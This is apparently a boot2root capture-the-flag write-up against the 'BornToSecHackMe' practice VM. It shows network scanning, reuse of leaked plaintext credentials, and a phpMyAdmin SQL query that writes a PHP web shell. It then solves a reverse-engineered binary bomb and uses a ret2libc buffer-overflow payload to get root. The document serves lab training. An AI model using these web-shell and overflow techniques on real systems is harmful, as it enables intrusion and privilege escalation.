# writeup1

- ifconfig

result:
```
➜  ~ ifconfig
bridge100: flags=8a63<UP,BROADCAST,SMART,RUNNING,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
	options=3<RXCSUM,TXCSUM>
	ether f2:2f:4b:00:8c:64
	inet 192.168.64.1 netmask 0xffffff00 broadcast 192.168.64.255
	inet6 fe80::f02f:4bff:fe00:8c64%bridge100 prefixlen 64 scopeid 0x16
	inet6 fda8:424a:3d63:d0fe:c9a:6453:629:bbd1 prefixlen 64 autoconf secured
	Configuration:
		id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0
		maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200
		root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0
		ipfilter disabled flags 0x0
	member: vmenet0 flags=3<LEARNING,DISCOVER>
	        ifmaxaddr 0 port 21 priority 0 path cost 0
	nd6 options=201<PERFORMNUD,DAD>
	media: autoselect
	status: active
```

- nmap local network

```
➜  ~ sudo nmap 192.168.64.0-255
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 18:24 CEST
Nmap scan report for 192.168.64.2
Host is up (0.0048s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
MAC Address: 66:F1:9A:FE:A6:3A (Unknown)

Nmap scan report for 192.168.64.1
Host is up (0.0030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
5000/tcp open  upnp
7000/tcp open  afs3-fileserver

Nmap done: 256 IP addresses (2 hosts up) scanned in 2.46 seconds
```

- use metasploit for scan port 80

result: we found the forum
```
msf6 auxiliary(scanner/http/dir_webdav_unicode_bypass) > use auxiliary/scanner/http/files_dir
msf6 auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.64.2
RHOSTS => 192.168.64.2
msf6 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.168.64.2:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension
[+] Found http://192.168.64.2:80/forum 403
[*] Using code '404' as not found for files with extension
[+] Found http://192.168.64.2:80/forum 403
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Go to `Problem to login ?` thread et search password

- forum

login: `lmezard`
password: `!q\]Ej?*5K5cy*AJ`

- webmail

login: `laurie@borntosec.net`
password: same as forum

- phpmyadmin

login: `root`
password: `Fg-'kKXBj87E:aJ$`

- Go to phpmyadmin and execute sql command: `SELECT '<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/cmd.php'`

- Go to this url: https://192.168.64.2/forum/templates_c/cmd.php?command=whoami

result: `www-data`

- Check python https://192.168.64.2/forum/templates_c/cmd.php?command=whereis%20python (resources: https://www.urlencoder.org/)

result: `python: /usr/bin/python /usr/bin/python2.7 /etc/python /etc/python2.7 /usr/lib/python2.7 /usr/bin/X11/python /usr/bin/X11/python2.7 /usr/local/lib/python2.7 /usr/include/python2.7 /usr/share/python /usr/share/man/man1/python.1.gz`

- ls the home https://192.168.64.2/forum/templates_c/cmd.php?command=ls%20-la%20%2Fhome

result:
```
total 0 drwxrwx--x 1 www-data root 60 Oct 13 2015 . drwxr-xr-x 1 root root 220 Aug 1 2022 .. drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard drwxr-x--- 3 thor thor 129 Oct 15 2015 thor drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz
```

- ls the folder LOOKATME https://192.168.64.2/forum/templates_c/cmd.php?command=ls%20-lA%20%2Fhome%2FLOOKATME

- Cat the file LOOKATME/password https://192.168.64.2/forum/templates_c/cmd.php?command=cat%20%2Fhome%2FLOOKATME%2Fpassword

`lmezard:G!@M6f4Eatau{sF"`

- Log to ftp with filezilla

result: 2 files
```
README
fun
```

README content: `Complete this little challenge and use the result as password for user 'laurie' to login in ssh`

- find fun

result: it is a tar file

- tar -xvf fun

result: ft_fun folder with many .pcap files

- Execute scripts/regenerate.py in ft_fun folder

result:
```
> python3 Regenerate.py
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
Hashed password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

- Connect to ssh with `ssh laurie@192.168.64.2`

```
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

- Play ./bomb game !

phase_1: `Public speaking is very easy.`
```
(gdb) disas main
(gdb) disas phase_1
(gdb) x /s 0x80497c0
0x80497c0:	 "Public speaking is very easy."
```

phase_2:
```c
uint32_t phase_2 (int32_t arg_8h)
{
    uint32_t _6digits[6];
    line = arg_8h;
    read_six_numbers (line, _6digits);
    if (_6digits != 1) {
        explode_bomb ();
    }
    i = 1;
    tab[6] = &_6digits;
    do {
        eax = i + 1;
        eax = tab[i] * eax;
        if (tab[i] != eax) {
            explode_bomb ();
        }
        i++;
    } while (i <= 5);
    return eax;
}
```

resultat:	`1 2 6 24 120 720`

phase_3:
```c
uint32_t phase_3 (const char * s) {
    int32_t var_18h;
    uint32_t var_ch;
    unsigned char var_5h;
    uint32_t var_4h;
    edx = s;
    eax = sscanf (edx, "%d %c %d", var_ch, var_5h, var_4h);
    if (eax <= 2) {
        explode_bomb ();
    }
    if (var_ch <= 7) {
        eax = var_ch;
        /* switch table (8 cases) at 0x80497e8 */
        bl = q;
        if (var_4h == 777) {
            goto label_0;
        }
        explode_bomb ();
        bl = b;
        if (var_4h == 214) {
            goto label_0;
        }
        explode_bomb ();
        bl = b;
        if (var_4h == 755) {
            goto label_0;
        }
        explode_bomb ();
        bl = k;
        if (var_4h == 251) {
            goto label_0;
        }
        explode_bomb ();
        bl = o;
        if (var_4h == 160) {
            goto label_0;
        }
        explode_bomb ();
        bl = t;
        if (var_4h == 458) {
            goto label_0;
        }
        explode_bomb ();
        bl = t;
        if (var_4h == 780) {
            goto label_0;
        }
        explode_bomb ();
        bl = b;
        if (var_4h == 524) {
            goto label_0;
        }
        explode_bomb ();
    }
    bl = x;
    explode_bomb ();
label_0:
    if (bl != var_5h) {
        explode_bomb ();
    }
    ebx = var_18h;
    return eax;
}
```

3 possible results:
`1 b 214`
`2 b 755`
`7 b 524`

phase_4:
```c
uint32_t phase_4 (const char * s) {
    va_list args;
    edx = s;
    eax = sscanf (edx, "%d", args);
    if (eax == 1) {
        if (args > 0) {
            goto label_0;
        }
    }
    explode_bomb ();
label_0:
    eax = args;
    eax = func4 (eax);
    if (eax != 0x37) { // 55 '7'
        explode_bomb ();
    }
    return eax;
}
```

result: `9`

phase_5:
```c
uint32_t phase_5 (int32_t arg_8h) {
    int32_t var_18h;
    int32_t var_8h;
    int32_t var_2h;
    ebx = arg_8h;
    eax = string_length (ebx);
    if (eax != 6) {
        explode_bomb ();
    }
    edx = 0;
    ecx = &var_8h;
    esi = "isrveawhobpnutfg";
    do {
        al = ebx[edx];
        al &= 0xf;
        eax = (int32_t) al;
        al = eax[esi];
        *((edx + ecx)) = al;
        edx++;
    } while (edx <= 5);
    var_2h = 0;
    eax = strings_not_equal (var_8h, "giants");
    if (eax != 0) {
        explode_bomb ();
    }
    esp = &var_18h;
    return eax;
}
```

result: `opekmq`

phase_6:
```c
uint32_t phase_6 (int32_t arg_8h) {
    int32_t var_58h;
    int32_t var_3ch;
    int32_t var_38h;
    int32_t var_34h;
    int32_t var_30h;
    int32_t var_18h;
    edx = arg_8h;
    var_34h = node1;
    read_six_numbers (edx, var_18h);
    edi = 0;
label_0:
    eax = &var_18h;
    eax = *((eax + edi*4));
    eax--;
    if (eax > 5) {
        explode_bomb ();
    }
    ebx = edi + 1;
    if (ebx > 5) {
        goto label_2;
    }
    eax = edi*4;
    var_38h = eax;
    esi = &var_18h;
    do {
        edx = var_38h;
        eax = edx[esi];
        if (eax == *((esi + ebx*4))) {
            explode_bomb ();
        }
        ebx++;
    } while (ebx <= 5);
label_2:
    edi++;
    if (edi <= 5) {
        goto label_0;
    }
    edi = 0;
    ecx = &var_18h;
    eax = &var_30h;
    var_3ch = eax;
label_1:
    esi = var_34h;
    ebx = 1;
    eax = edi*4;
    edx = eax;
    if (ebx >= *((eax + ecx))) {
        goto label_3;
    }
    eax = *((edx + ecx));
    do {
        esi = *((esi + 8));
        ebx++;
    } while (ebx < eax);
label_3:
    edx = var_3ch;
    *((edx + edi*4)) = esi;
    edi++;
    if (edi <= 5) {
        goto label_1;
    }
    esi = var_30h;
    var_34h = var_30h;
    edi = 1;
    edx = &var_30h;
    do {
        eax = *((edx + edi*4));
        *((esi + 8)) = eax;
        esi = eax;
        edi++;
    } while (edi <= 5);
    *((esi + 8)) = 0;
    esi = var_34h;
    edi = 0;
    do {
        edx = *((esi + 8));
        eax = *(esi);
        if (eax < *(edx)) {
            explode_bomb ();
        }
        esi = *((esi + 8));
        edi++;
    } while (edi <= 4);
    esp = &var_58h;
    return eax;
}
```

```
(gdb) p node1
$1 = 253
(gdb) p node2
$2 = 725
(gdb) p node3
$3 = 301
(gdb) p node4
$4 = 997
(gdb) p node5
$5 = 212
(gdb) p node6
$6 = 432
```

4 > 2 > 6 > 3 > 1 > 5

result: `4 2 6 3 1 5`

thor ssh password `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
thor ssh password `Publicspeakingisveryeasy.126241207202b7559opekmq426315` <=== good
thor ssh password `Publicspeakingisveryeasy.126241207207b5249opekmq426315`

true thor password `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

```
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

```
The message is: "SLASH"
md5(SLASH) = 646da671ca01bb5d84dbb5fb2238dc8e
```

```
(gdb) r
Starting program: /home/zaz/exploit_me 
[Inferior 1 (process 2065) exited with code 01]
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

# https://beta.hackndo.com/retour-a-la-libc/

```
(gdb) find __libc_start_main,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found

zaz@BornToSecHackMe:~$ ./exploit_me $(python -c "print('a'*140 + '\x60\xb0\xe6\xb7' 'OSEF' + '\x58\xcc\xf8\xb7')")
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`??OSEFX???
# ls
exploit_me  mail
# whoami
root
#
``